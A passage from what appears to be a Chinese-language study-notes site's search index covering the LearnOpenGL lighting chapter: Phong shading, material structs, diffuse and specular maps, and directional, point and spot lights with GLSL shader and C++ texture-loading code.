\u7269\u4f53\u67d0\u4e00\u90e8\u5206\u8d8a\u662f\u6b63\u5bf9\u5149\u6e90\uff0c\u5b83\u5c31\u4f1a\u8d8a\u4eae</li> <li>\u955c\u9762\u53cd\u5c04 specular\uff1a \u6a21\u62df\u6709\u5149\u6cfd\u7269\u4f53\u4e0a\u7684\u4eae\u70b9</li> </ul> <p>\u5176\u4e2d\uff0c\u6f2b\u53cd\u5c04\u548c\u955c\u9762\u53cd\u5c04\u5149\u7ebf\u5f3a\u5ea6\u7684\u8ba1\u7b97\u9700\u8981\u8be5\u70b9\u7684\u6cd5\u7ebf\u65b9\u5411\u3002\u7531\u4e8e\u6211\u4eec\u4f7f\u7528\u7684\u662f\u4e00\u4e2a\u7b80\u5355\u7684 3D \u7acb\u65b9\u4f53\uff0c\u53ef\u4ee5\u7b80\u5355\u5730\u5c06\u6cd5\u7ebf\u6570\u636e\u52a0\u5165\u9876\u70b9\u6570\u636e\u4e2d\u3002</p> <p>\u6839\u636e \u5e26\u6cd5\u7ebf\u7684\u9876\u70b9\u6570\u636e \uff0c\u6211\u4eec\u91cd\u65b0\u4fee\u6539\u9876\u70b9\u5c5e\u6027\u6307\u9488\u4f7f\u5f97\u7740\u8272\u5668\u80fd\u591f\u6b63\u786e\u8bc6\u522b\u6570\u636e\uff1a</p> <pre><code>// \u8bbe\u7f6e\u7269\u4f53\u9876\u70b9\u5c5e\u6027\u6307\u9488\n// position attribute\nglVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 6 * sizeof(float), (void*)0);\nglEnableVertexAttribArray(0);\n// normal attribute\nglVertexAttribPointer(1, 3, GL_FLOAT, GL_FALSE, 6 * sizeof(float), (void*)(3 * sizeof(float)));\nglEnableVertexAttribArray(1);\n\n// \u8bbe\u7f6e\u5149\u6e90\u9876\u70b9\u5c5e\u6027\u6307\u9488\uff08\u5149\u6e90\u548c\u7269\u4f53\u91c7\u7528\u540c\u4e00\u4e2a vertices \u6570\u7ec4\uff09\nglVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 6 * sizeof(float), (void*)0);\nglEnableVertexAttribArray(0);\n</code></pre> <p>\u6211\u4eec\u9700\u8981\u5c06\u67d0\u9876\u70b9\u7684\u6cd5\u7ebf\u6570\u636e\u548c\u53d8\u6362\u540e\u7684\u4f4d\u7f6e\u4ece\u9876\u70b9\u7740\u8272\u5668\u4f20\u8f93\u7ed9\u7247\u6bb5\u7740\u8272\u5668\uff0c\u56e0\u6b64\u9876\u70b9\u7740\u8272\u5668\u7684\u4ee3\u7801\u4fee\u6539\u4e3a\uff1a</p> <pre><code>#version 330 core\n\nlayout (location = 0) in vec3 aPos;\nlayout (location = 1) in vec3 aNormal;\n\nout vec3 Normal;\nout vec3 FragPos;\n\nuniform mat4 model;\nuniform mat4 view;\nuniform mat4 projection;\n\nvoid main()\n{\n    gl_Position = projection * view * model * vec4(aPos, 1.0f);\n    FragPos = (model * vec4(aPos, 1.0f)).xyz;\n    Normal = mat3(transpose(inverse(model))) * aNormal;\n}\n</code></pre> <p>\u77e9\u9635\u6c42\u9006</p> <p>\u77e9\u9635\u6c42\u9006\u662f\u4e00\u4e2a\u76f8\u5f53\u590d\u6742\u7684\u8fd0\u7b97\uff0c\u6211\u4eec\u5e94\u8be5\u5c3d\u53ef\u80fd\u907f\u514d\u5728\u7740\u8272\u5668\u4e2d\u8fdb\u884c\u6c42\u9006\u8fd0\u7b97\u3002\u5bf9\u4e8e\u4e00\u4e2a\u9ad8\u6548\u5e94\u7528\u6765\u8bf4\uff0c\u6700\u597d\u5728\u5916\u90e8(CPU)\u4e2d\u6c42\u51fa\u9006\u77e9\u9635\uff0c\u7136\u540e\u901a\u8fc7 uniform \u4f20\u5165\u7740\u8272\u5668\u3002\u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\u7406\u89e3\uff0c\u6b64\u5904\u4ecd\u7136\u628a\u6c42\u9006\u64cd\u4f5c\u653e\u4e8e\u7740\u8272\u5668\u5185\u3002</p> <p>\u800c Phong Lighting Model \u4e0b\u7684\u7247\u6bb5\u7740\u8272\u5668\u4ee3\u7801\u4e3a\uff1a</p> <pre><code>#version 330 core\n\nin vec3 Normal;\nin vec3 FragPos;\n\nout vec4 FragColor;\n\nuniform vec3 lightPos; // \u5149\u6e90\u4f4d\u7f6e\nuniform vec3 lightcolor; // \u5149\u6e90\u989c\u8272\nuniform vec3 objectcolor; // \u7269\u4f53\u989c\u8272\nuniform vec3 viewPos; // \u89c2\u5bdf\u8005\u4f4d\u7f6e\n\nvoid main()\n{\n    // ambient\n    float ambientStrength = 0.1; // \u73af\u5883\u5149\u5f3a\u5ea6\u56e0\u5b50\n    vec3 ambient = ambientStrength * lightcolor;\n\n    // diffuse\n    vec3 norm = normalize(Normal); // \u6cd5\u5411\u91cf\n    vec3 lightDir = normalize(lightPos - FragPos); // \u5149\u7ebf\u65b9\u5411\n    float diff = max(dot(norm, lightDir), 0.0); // \u8ba1\u7b97\u6f2b\u53cd\u5c04\u5f3a\u5ea6\n    vec3 diffuse = diff * lightcolor;\n\n    // specular\n    float specularStrength = 0.5;\n    vec3 viewDir = normalize(viewPos - FragPos);\n    vec3 reflectDir = reflect(-lightDir, norm);\n    float spec = pow(max(dot(viewDir, reflectDir), 0.0), 32); // 32: \u53cd\u5149\u5ea6\uff1b\u53cd\u5149\u5ea6\u8d8a\u9ad8\uff0c\u9ad8\u5149\u8d8a\u5c0f\n    vec3 specular = specularStrength * spec * lightcolor;\n\n    vec3 result = (ambient + diffuse + specular) * objectcolor;\n\n    FragColor = vec4(result, 1.0f);\n}\n</code></pre> Gouraud \u7740\u8272\u548c Phong \u7740\u8272 <p>\u65e9\u671f\u5f00\u53d1\u8005\u66fe\u7ecf\u5728\u9876\u70b9\u7740\u8272\u5668\u4e2d\u5b9e\u73b0\u5149\u7167\u6a21\u578b\u7684\u8ba1\u7b97\uff0c\u76f8\u6bd4\u4e8e\u5728\u7247\u6bb5\u7740\u8272\u5668\u4e2d\u8ba1\u7b97\uff0c\u5149\u7167\u8ba1\u7b97\u9891\u7387\u8981\u4f4e\u5f97\u591a\uff0c\u56e0\u6b64\u66f4\u52a0\u9ad8\u6548\u3002\u4f46\u662f\u6700\u7ec8\u5f97\u5230\u7684\u989c\u8272\u503c\u4ec5\u4ec5\u6709\u5468\u56f4\u51e0\u4e2a\u9876\u70b9\u7684\u989c\u8272\u7ebf\u6027\u63d2\u503c\u8ba1\u7b97\uff0c\u6548\u679c\u4e0d\u591f\u771f\u5b9e\uff0c\u8fd9\u79cd\u7740\u8272\u79f0\u4e3a Gouraud \u7740\u8272\u3002\u800c\u7247\u6bb5\u7740\u8272\u5668\u8fd0\u884c\u4e8e\u5149\u6805\u5316\u4e4b\u540e\uff0c\u56e0\u6b64 Phong \u7740\u8272\u4f1a\u5bf9\u6bcf\u4e2a Pixel \u90fd\u8ba1\u7b97\u989c\u8272\u3002</p> <p></p> \u53cd\u5149\u5ea6 p <p></p> <p>\u6700\u7ec8\u5f97\u5230\u6548\u679c\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Accumulation/LearnOpenGL/2.%E5%85%89%E7%85%A7/#_4","title":"\u6750\u8d28","text":""},{"location":"Accumulation/LearnOpenGL/2.%E5%85%89%E7%85%A7/#_5","title":"\u6750\u8d28\u7ed3\u6784\u4f53","text":"<p>\u5728\u73b0\u5b9e\u4e16\u754c\u4e2d\uff0c\u4e0d\u540c\u6750\u8d28\u7684\u7269\u4f53\u5bf9\u5149\u6709\u4e0d\u540c\u7684\u6548\u679c\u3002\u4e3a\u4e86\u5728 OpenGL \u4e2d\u6a21\u62df\u591a\u79cd\u7c7b\u578b\u7684\u7269\u4f53\uff0c\u6211\u4eec\u9700\u8981\u9488\u5bf9\u6bcf\u79cd\u8868\u9762\u5b9a\u4e49\u4e0d\u540c\u7c7b\u578b\u7684\u6750\u8d28\u3002</p> <p>\u5f53\u63cf\u8ff0\u4e00\u4e2a\u8868\u9762\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5206\u522b\u4e3a\u4e09\u4e2a\u5149\u7167\u5206\u91cf\u5b9a\u4e49\u4e00\u4e2a\u6750\u8d28\u989c\u8272(Material Color)\uff1a\u73af\u5883\u5149\u7167(Ambient Lighting)\u3001\u6f2b\u53cd\u5c04\u5149\u7167(Diffuse Lighting)\u548c\u955c\u9762\u5149\u7167(Specular Lighting)\u3002\u901a\u8fc7\u4e3a\u6bcf\u4e2a\u5206\u91cf\u6307\u5b9a\u4e00\u4e2a\u989c\u8272\uff0c\u6211\u4eec\u5c31\u80fd\u591f\u5bf9\u8868\u9762\u7684\u989c\u8272\u8f93\u51fa\u6709\u7ec6\u7c92\u5ea6\u7684\u63a7\u5236\u4e86\u3002\u73b0\u5728\uff0c\u6211\u4eec\u518d\u6dfb\u52a0\u4e00\u4e2a\u53cd\u5149\u5ea6(Shininess)\u5206\u91cf\uff0c\u7ed3\u5408\u4e0a\u8ff0\u7684\u4e09\u4e2a\u989c\u8272\uff0c\u6211\u4eec\u5c31\u6709\u4e86\u5168\u90e8\u6240\u9700\u7684\u6750\u8d28\u5c5e\u6027\u4e86\uff1a</p> <pre><code>#version 330 core\nstruct Material {\n    vec3 ambient;\n    vec3 diffuse;\n    vec3 specular;\n    float shininess;\n}; \n\nuniform Material material;\n</code></pre> <p>\u955c\u9762\u53cd\u5c04\u7684 \\(p=128 * shininess\\)</p> <p>\u7531\u8fd9\u56db\u4e2a\u5143\u7d20\u5b9a\u4e49\u7684\u7269\u4f53\u6750\u8d28\uff0c\u6211\u4eec\u53ef\u4ee5\u6a21\u62df\u51fa\u5f88\u591a\u73b0\u5b9e\u4e16\u754c\u7269\u4f53\u7684\u6750\u8d28\uff0chttp://devernay.free.fr/cours/opengl/materials.html\u4e2d\u6709\u8868\u683c\u5c55\u793a\u4e86\u6750\u8d28\u5bf9\u7acb\u65b9\u4f53\u7684\u5f71\u54cd\uff1a</p> <p></p> <p>\u4ee5\u56fe\u4e2d\u7684 Emerald(\u7fe1\u7fe0) \u4e3a\u4f8b\uff0c\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7 <code>setVec3</code> \u6765\u8bbe\u7f6e\u6750\u8d28\uff1a</p> <pre><code>ShaderProgram.setVec3(\"material.ambient\", 0.0215f, 0.1745f, 0.0215f);\nShaderProgram.setVec3(\"material.diffuse\", 0.07568f, 0.61424f, 0.07568f);\nShaderProgram.setVec3(\"material.specular\", 0.633f, 0.727811f, 0.633f);\nShaderProgram.setFloat(\"material.shininess\", 0.6f * 128.0f);\n</code></pre> <p>\u6211\u4eec\u8fd8\u9700\u8981\u5bf9\u5149\u7684\"\u6750\u8d28\"\u8fdb\u884c\u7ec6\u5316\uff0c\u8981\u6c42\u5149\u5bf9\u4e8e\u73af\u5883\u53cd\u5c04\u3001\u6f2b\u53cd\u5c04\u548c\u955c\u9762\u53cd\u5c04\u7684\u5206\u91cf\u5927\u5c0f\u4e0d\u540c\u3002\u5b9a\u4e49\u5149\u7684\u7ed3\u6784\u4f53\u5982\u4e0b\uff1a</p> <pre><code>struct Light {\n    vec3 position;\n\n    vec3 ambient;\n    vec3 diffuse;\n    vec3 specular;\n};\n\nuniform Light light;\n</code></pre> <p>\u4e00\u79cd\u793a\u4f8b\u7528\u7684\u5149\u7ebf\u5f3a\u5ea6\u8bbe\u7f6e\u5982\u4e0b\uff1a</p> <pre><code>ShaderProgram.setVec3(\"light.ambient\", 0.2f, 0.2f, 0.2f);\nShaderProgram.setVec3(\"light.diffuse\", 0.5f, 0.5f, 0.5f); // \u5c06\u5149\u7167\u8c03\u6697\u4e86\u4e00\u4e9b\u4ee5\u642d\u914d\u573a\u666f\nShaderProgram.setVec3(\"light.specular\", 1.0f, 1.0f, 1.0f);\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u5c06\u5176\u79f0\u4e3a\u6f2b\u53cd\u5c04\u7387\u3001\u955c\u9762\u53cd\u5c04\u7387\u7b49</p> <p>\u6700\u7ec8\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u8f83\u597d\u7684\u6548\u679c\u3002</p>"},{"location":"Accumulation/LearnOpenGL/2.%E5%85%89%E7%85%A7/#_6","title":"\u5149\u7167\u8d34\u56fe","text":"<p>\u73b0\u5b9e\u4e16\u754c\u7684\u7269\u4f53\u5f80\u5f80\u5e76\u4e0d\u5305\u542b\u4e00\u4e2a\u6750\u8d28\uff0c\u4e00\u4e2a\u7269\u4f53\u7684\u4e0d\u540c\u90e8\u4ef6\u5f80\u5f80\u9700\u8981\u4e0d\u540c\u7684\u6750\u8d28\u5c5e\u6027\u3002</p> <p>\u672c\u8282\u6211\u4eec\u5c06\u62d3\u5c55\u4e4b\u524d\u7684\u7cfb\u7edf\uff0c\u5f15\u5165\u6f2b\u53cd\u5c04\u548c\u955c\u9762\u5149\u8d34\u56fe(Map)\uff0c\u8fd9\u5141\u8bb8\u6211\u4eec\u5bf9\u7269\u4f53\u7684\u5149\u5206\u91cf\u6709\u7740\u66f4\u7cbe\u786e\u7684\u63a7\u5236\u3002</p> <p>\u5728\u5149\u7167\u573a\u666f\u4e2d\uff0c\u7eb9\u7406\u5c31\u76f8\u5f53\u4e8e\u662f\u4e00\u5f20\u6f2b\u53cd\u5c04\u8d34\u56fe(Diffuse Map)\uff0c\u5b83\u8868\u73b0\u4e86\u7269\u4f53\u6240\u6709\u7684\u6f2b\u53cd\u5c04\u989c\u8272\u7684\u7eb9\u7406\u56fe\u50cf\u3002</p> <p>\u4e3a\u6b64\uff0c\u6211\u4eec\u9700\u8981\u5c06\u4e4b\u524d\u5b9a\u4e49\u7684 <code>vec3</code> \u7c7b\u578b\u7684\u6f2b\u53cd\u5c04\u989c\u8272\u5411\u91cf\u66f4\u6362\u4e3a <code>sampler2D</code> \u7c7b\u578b\u7684\u8d34\u56fe:</p> <pre><code>struct Material {\n    sampler2D diffuse;\n    vec3      specular;\n    float     shininess;\n}; \n...\nin vec2 TexCoords;\n</code></pre> <p>\u6b64\u5904\u4e5f\u79fb\u9664\u4e86\u73af\u5883\u5149\u989c\u8272\u5411\u91cf\uff0c\u56e0\u4e3a\u73af\u5883\u5149\u989c\u8272\u4e00\u822c\u7b49\u4e8e\u6f2b\u53cd\u5c04\u989c\u8272\uff0c\u4e0d\u9700\u8981\u5206\u5f00\u5b58\u50a8</p> <p>\u4e3a\u4e86\u65b9\u4fbf\u65e5\u540e\u4ee3\u7801\u7684\u7f16\u5199\uff0c\u6b64\u5904\u5f00\u59cb\u5c06\u8bfb\u53d6\u56fe\u7247\u7684\u6b65\u9aa4\u88c5\u5165\u4e00\u4e2a\u72ec\u7acb\u7684\u51fd\u6570\u4e2d\uff1a</p> <pre><code>// usage\nunsigned int texture = loadTexture(\"container.png\");\n\n\n// function\nunsigned int loadTexture(char const* path)\n{\n    unsigned int textureID;\n    glGenTextures(1, &amp;textureID);\n\n    int width, height, nrComponents;\n    unsigned char* data = stbi_load(path, &amp;width, &amp;height, &amp;nrComponents, 0);\n    if (data)\n    {\n        GLenum format;\n        if (nrComponents == 1)\n            format = GL_RED;\n        else if (nrComponents == 3)\n            format = GL_RGB;\n        else if (nrComponents == 4)\n            format = GL_RGBA;\n\n        glBindTexture(GL_TEXTURE_2D, textureID);\n        glTexImage2D(GL_TEXTURE_2D, 0, format, width, height, 0, format, GL_UNSIGNED_BYTE, data);\n        glGenerateMipmap(GL_TEXTURE_2D);\n\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\n        stbi_image_free(data);\n    }\n    else\n    {\n        std::cout &lt;&lt; \"Texture failed to load at path: \" &lt;&lt; path &lt;&lt; std::endl;\n        stbi_image_free(data);\n    }\n\n    return textureID;\n}\n</code></pre> <p>\u800c\u955c\u9762\u5149\u8d34\u56fe\u9700\u8981\u989d\u5916\u4e00\u4e2a\u7eb9\u7406\u6570\u636e\u6765\u5b58\u50a8\uff0c\u5176\u4e2d\uff0c\u9ed1\u8272\u5411\u91cf <code>vec3(0.0)</code> \u4ee3\u8868\u4e0d\u4f1a\u53cd\u5c04\u5149\u3002\u4e00\u4e2a\u50cf\u7d20\u8d8a'\u767d'\uff0c\u7269\u4f53\u7684\u955c\u9762\u53cd\u5c04\u5149\u8d8a\u5927\u3002</p> <p>\u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u80fd\u5f97\u5230\u4e00\u4e2a\u66f4\u771f\u5b9e\u7684\u7bb1\u5b50\uff1a</p> <pre><code>unsigned int diffuseMap = loadTexture(\"container2.png\");\nunsigned int specularMap = loadTexture(\"container2_specular.png\");\n\nglActiveTexture(GL_TEXTURE0);\nglBindTexture(GL_TEXTURE_2D, diffuseMap);\nglActiveTexture(GL_TEXTURE1);\nglBindTexture(GL_TEXTURE_2D, specularMap);\n\n[ ... ]\n\nShaderProgram.setInt(\"material.diffuse\", 0);\nShaderProgram.setInt(\"material.specular\", 1);\n</code></pre> <p>\u8bb0\u5f97\u4fee\u6539\u5bf9\u5e94\u7247\u6bb5\u7740\u8272\u5668\u548c\u9876\u70b9\u6570\u636e</p>"},{"location":"Accumulation/LearnOpenGL/2.%E5%85%89%E7%85%A7/#_7","title":"\u6295\u5149\u7269","text":"<p>\u73b0\u5b9e\u4e16\u754c\u6709\u7740\u5f88\u591a\u79cd\u8868\u73b0\u4e0d\u540c\u7684\u5149\u6e90\uff0c\u5c06\u5149\u6295\u5c04\u5230\u7269\u4f53\u7684\u5149\u6e90\u53eb\u505a\u6295\u5149\u7269(Light Caster)\u3002</p> <p>1. \u5e73\u884c\u5149</p> <p>\u5f53\u4e00\u4e2a\u5149\u6e90\u4f4d\u4e8e\u5f88\u8fdc\u7684\u5730\u65b9\uff0c\u6765\u81ea\u5149\u6e90\u7684\u6bcf\u6761\u5149\u7ebf\u53ef\u4ee5\u89c6\u4e3a\u76f8\u4e92\u5e73\u884c\u3002\u5f53\u6211\u4eec\u4f7f\u7528\u4e00\u4e2a\u5047\u8bbe\u5149\u6e90\u5904\u4e8e\u65e0\u9650\u8fdc\u5904\u7684\u6a21\u578b\u65f6\uff0c\u5b83\u5c31\u88ab\u79f0\u4e3a\u5b9a\u5411\u5149\uff0c\u5b83\u4e0e\u5149\u6e90\u7684\u4f4d\u7f6e\u662f\u6ca1\u6709\u5173\u7cfb\u7684\u3002</p> <p>\u5bf9\u4e8e\u5e73\u884c\u5149\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u989d\u5916\u5b9a\u4e49\u5149\u6e90\u7684\u4f4d\u7f6e\u6765\u8ba1\u7b97 <code>lightDir</code>\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728 Light \u7ed3\u6784\u4f53\u4e2d\u7ef4\u62a4\u5176 <code>direction</code>\uff1a</p> <pre><code>struct Light {\n    // vec3 position; // \u4f7f\u7528\u5b9a\u5411\u5149\u5c31\u4e0d\u518d\u9700\u8981\u4e86\n    vec3 direction;\n\n    vec3 ambient;\n    vec3 diffuse;\n    vec3 specular;\n};\n...\nvoid main()\n{\n  vec3 lightDir = normalize(-light.direction);\n  ...\n}\n</code></pre> <p>2. \u70b9\u5149\u6e90</p> <p>\u70b9\u5149\u6e90\u662f\u5904\u4e8e\u4e16\u754c\u67d0\u4e00\u4f4d\u7f6e\u7684\u5149\u6e90\uff0c\u5b83\u4f1a\u671d\u5411\u6240\u6709\u65b9\u5411\u53d1\u5c04\u5149\uff0c\u4f46\u5149\u7ebf\u5f3a\u5ea6\u968f\u8ddd\u79bb\u9012\u51cf\u3002</p> <p>\u4e00\u822c\u6765\u8bb2\uff0c\u5149\u7684\u8870\u51cf\u516c\u5f0f\u4e3a\uff1a</p> \\[ F_{att}=\\frac{1.0}{K_c+ K_l \\cdot d+ K_q \\cdot d^2} \\] <p>\u5176\u4e2d\u5e38\u6570\u9879 \\(K_c\\)\uff0c\u4e00\u6b21\u9879 \\(K_l\\)\uff0c\u4e8c\u6b21\u9879 \\(K_q\\) \u90fd\u662f\u53ef\u914d\u7f6e\u7684\u3002</p> <ul> <li>\u5e38\u6570\u9879\u901a\u5e38\u4fdd\u6301\u4e3a1.0\uff0c\u5b83\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u4fdd\u8bc1\u5206\u6bcd\u6c38\u8fdc\u4e0d\u4f1a\u6bd41\u5c0f\uff0c\u5426\u5219\u7684\u8bdd\u5728\u67d0\u4e9b\u8ddd\u79bb\u4e0a\u5b83\u53cd\u800c\u4f1a\u589e\u52a0\u5f3a\u5ea6\uff0c\u8fd9\u80af\u5b9a\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684\u6548\u679c\u3002</li> <li>\u4e00\u6b21\u9879\u4f1a\u4e0e\u8ddd\u79bb\u503c\u76f8\u4e58\uff0c\u4ee5\u7ebf\u6027\u7684\u65b9\u5f0f\u51cf\u5c11\u5f3a\u5ea6\u3002</li> <li>\u4e8c\u6b21\u9879\u4f1a\u4e0e\u8ddd\u79bb\u7684\u5e73\u65b9\u76f8\u4e58\uff0c\u8ba9\u5149\u6e90\u4ee5\u4e8c\u6b21\u9012\u51cf\u7684\u65b9\u5f0f\u51cf\u5c11\u5f3a\u5ea6\u3002\u4e8c\u6b21\u9879\u5728\u8ddd\u79bb\u6bd4\u8f83\u5c0f\u7684\u65f6\u5019\u5f71\u54cd\u4f1a\u6bd4\u4e00\u6b21\u9879\u5c0f\u5f88\u591a\uff0c\u4f46\u5f53\u8ddd\u79bb\u503c\u6bd4\u8f83\u5927\u7684\u65f6\u5019\u5b83\u5c31\u4f1a\u6bd4\u4e00\u6b21\u9879\u66f4\u5927\u4e86\u3002</li> </ul> <p>\u7531\u4e8e\u4e8c\u6b21\u9879\u7684\u5b58\u5728\uff0c\u5149\u7ebf\u5728\u5927\u90e8\u5206\u65f6\u5019\u4ee5\u7ebf\u6027\u8870\u9000\uff0c\u76f4\u5230\u8ddd\u79bb\u53d8\u5f97\u8db3\u591f\u5927\u65f6\uff0c\u5149\u5f3a\u4f1a\u4ee5\u66f4\u5feb\u7684\u901f\u5ea6\u4e0b\u964d\u3002</p> <p>\u6b63\u786e\u5730\u8bbe\u5b9a\u5b83\u4eec\u7684\u503c\u53d6\u51b3\u4e8e\u5f88\u591a\u56e0\u7d20\uff1a\u73af\u5883\u3001\u5e0c\u671b\u5149\u8986\u76d6\u7684\u8ddd\u79bb\u3001\u5149\u7684\u7c7b\u578b\u7b49\u3002\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u8fd9\u90fd\u662f\u7ecf\u9a8c\u7684\u95ee\u9898\uff0c\u4ee5\u53ca\u9002\u91cf\u7684\u8c03\u6574\u3002</p> <p>\u4e0b\u9762\u8fd9\u4e2a\u8868\u683c\u663e\u793a\u4e86\u6a21\u62df\u4e00\u4e2a\uff08\u5927\u6982\uff09\u771f\u5b9e\u7684\uff0c\u8986\u76d6\u7279\u5b9a\u534a\u5f84\uff08\u8ddd\u79bb\uff09\u7684\u5149\u6e90\u65f6\uff0c\u8fd9\u4e9b\u9879\u53ef\u80fd\u53d6\u7684\u4e00\u4e9b\u503c\u3002\u7b2c\u4e00\u5217\u6307\u5b9a\u7684\u662f\u5728\u7ed9\u5b9a\u7684\u4e09\u9879\u65f6\u5149\u6240\u80fd\u8986\u76d6\u7684\u8ddd\u79bb\u3002\u8fd9\u4e9b\u503c\u662f\u5927\u591a\u6570\u5149\u6e90\u5f88\u597d\u7684\u8d77\u59cb\u70b9\uff0c\u5b83\u4eec\u7531Ogre3D\u7684Wiki\u6240\u63d0\u4f9b\uff1a</p> \u8ddd\u79bb \u5e38\u6570\u9879 \u4e00\u6b21\u9879 \u4e8c\u6b21\u9879 7 1.0 0.7 1.8 13 1.0 0.35 0.44 20 1.0 0.22 0.20 32 1.0 0.14 0.07 50 1.0 0.09 0.032 65 1.0 0.07 0.017 100 1.0 0.045 0.0075 160 1.0 0.027 0.0028 200 1.0 0.022 0.0019 325 1.0 0.014 0.0007 600 1.0 0.007 0.0002 3250 1.0 0.0014 0.000007 <p>\u5728\u6211\u4eec\u7684\u73af\u5883\u4e2d\uff0c32\u5230100\u7684\u8ddd\u79bb\u5bf9\u5927\u591a\u6570\u7684\u5149\u6e90\u90fd\u8db3\u591f\u4e86</p> <p>\u6211\u4eec\u5c06\u8fd9\u4e09\u4e2a\u503c\u653e\u7f6e\u5728 Light \u7ed3\u6784\u4f53\u4e2d\uff1a</p> <pre><code>struct Light {\n    vec3 position;  \n\n    vec3 ambient;\n    vec3 diffuse;\n    vec3 specular;\n\n    float constant;\n    float linear;\n    float quadratic;\n};\n</code></pre> <p>\u5728\u7247\u6bb5\u7740\u8272\u5668\u4e2d\uff0c\u6211\u4eec\u901a\u8fc7 GLSL \u5185\u7f6e\u7684 <code>length</code> \u51fd\u6570\u8ba1\u7b97\u8ddd\u79bb\uff1a</p> <pre><code>float distance    = length(light.position - FragPos);\nfloat attenuation = 1.0 / (light.constant + light.linear * distance + light.quadratic * (distance * distance));\n\nresult = (ambient + diffuse + specular) * attenuation + emission;\n</code></pre> <p>3. \u805a\u5149</p> <p>\u805a\u5149\u662f\u4f4d\u4e8e\u73af\u5883\u67d0\u4e00\u4f4d\u7f6e\u7684\u5149\u6e90\uff0c\u5b83\u53ea\u671d\u67d0\u4e00\u7279\u5b9a\u65b9\u5411\u8303\u56f4\u53d1\u5c04\u5149\u7ebf\uff0c\u4f8b\u5982\u8def\u706f\u3001\u624b\u7535\u7b52\u7b49\u3002</p> <p>OpenGL \u4e2d\uff0c\u805a\u5149\u901a\u8fc7\u4e00\u4e2a\u4e16\u754c\u7a7a\u95f4\u4f4d\u7f6e\u3001\u4e00\u4e2a\u65b9\u5411\u3001\u4e00\u4e2a\u5207\u5149\u89d2(Cutoff Angle)\u6765\u5b9a\u4e49\u3002</p> <p></p> <ul> <li><code>LightDir</code>\uff1a\u4ece\u7247\u6bb5\u6307\u5411\u5149\u6e90\u7684\u5411\u91cf\u3002</li> <li><code>SpotDir</code>\uff1a\u805a\u5149\u6240\u6307\u5411\u7684\u65b9\u5411\u3002</li> <li><code>Phi</code> \\(\\phi\\) \uff1a\u6307\u5b9a\u4e86\u805a\u5149\u534a\u5f84\u7684\u5207\u5149\u89d2\u3002\u843d\u5728\u8fd9\u4e2a\u89d2\u5ea6\u4e4b\u5916\u7684\u7269\u4f53\u90fd\u4e0d\u4f1a\u88ab\u8fd9\u4e2a\u805a\u5149\u6240\u7167\u4eae\u3002</li> <li><code>Theta</code> \\(\\theta\\) \uff1aLightDir\u5411\u91cf\u548cSpotDir\u5411\u91cf\u4e4b\u95f4\u7684\u5939\u89d2\u3002\u5728\u805a\u5149\u5185\u90e8\u7684\u8bdd \\(\\theta\\) \u503c\u5e94\u8be5\u6bd4 \\(\\phi\\) \u503c\u5c0f\u3002</li> </ul> <p>\u540c\u65f6\uff0c\u4e3a\u4e86\u5b9e\u73b0\u8fb9\u7f18\u5e73\u6ed1\u8f6f\u5316\uff0c\u6211\u4eec\u8fd8\u989d\u5916\u7ef4\u62a4\u4e00\u4e2a <code>outerCutOff</code> \u6210\u5458\u53d8\u91cf\uff0c\u6700\u7ec8\u805a\u5149\u706f\u7684\u6784\u9020\u5982\u4e0b\uff1a</p> <pre><code>struct SpotLight {\n    bool useSpotlight;\n\n    vec3 position;\n    vec3 direction;\n    float cutOff;\n    float outerCutOff;\n\n    vec3 ambient;\n    vec3 diffuse;\n    vec3 specular;\n\n    float constant;\n    float linear;\n    float quadratic;\n};\n\n\n// in Fragment Shader's Main\n    // Spot light\n    if(spotlight.useSpotlight)\n    {\n        distance = length(spotlight.position - FragPos);\n        attenuation = 1.0 / (spotlight.constant + spotlight.linear * distance + spotlight.quadratic * (distance * distance));\n\n        vec3 lightDir = normalize(spotlight.position - FragPos);\n        float theta = dot(lightDir, normalize(-spotlight.direction));\n        float epsilon = spotlight.cutOff - spotlight.outerCutOff;\n        float intensity = clamp((theta - spotlight.outerCutOff) / epsilon, 0.0, 1.0);\n\n        // ambient\n        ambient = spotlight.ambient * vec3(texture(material.diffuse, TexCoords));\n\n        // diffuse\n        diff = max(dot(norm, lightDir), 0.0);\n        diffuse = spotlight.diffuse * (diff * vec3(texture(material.diffuse, TexCoords)));\n\n        // specular\n        reflectDir = reflect(-lightDir, norm);\n        spec = pow(max(dot(viewDir, reflectDir), 0.0), material.shininess);\n        specular = spotlight.specular * (spec * vec3(texture(material.specular, TexCoords)));\n\n        result += (ambient + diffuse + specular) * attenuation * intensity + emission;\n    }\n</code></pre> <p>\u5149\u4ece\u5185\u5706\u9525\u8fb9\u754c\u9010\u6e10\u51cf\u6697\u5230\u5916\u5706\u9525\u8fb9\u754c</p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u624b\u7535\u7b52\u5149\u6e90\uff0c\u6211\u4eec\u8981\u6c42\u624b\u7535\u7b52\u7684\u4f4d\u7f6e\u4ee5\u53ca\u671d\u5411\u548c\u76f8\u673a\u76f8\u540c\uff0c\u56e0\u6b64\u5728 render loop \u4e2d\u9700\u8981\u8fdb\u884c\u5982\u4e0b\u8bbe\u7f6e\uff1a</p> <pre><code>// flash\nShaderProgram.setVec3(\"spotlight.position\", camera.Position.x, camera.Position.y, camera.Position.z);\nShaderProgram.setVec3(\"spotlight.direction\", camera.Front.x, camera.Front.y, 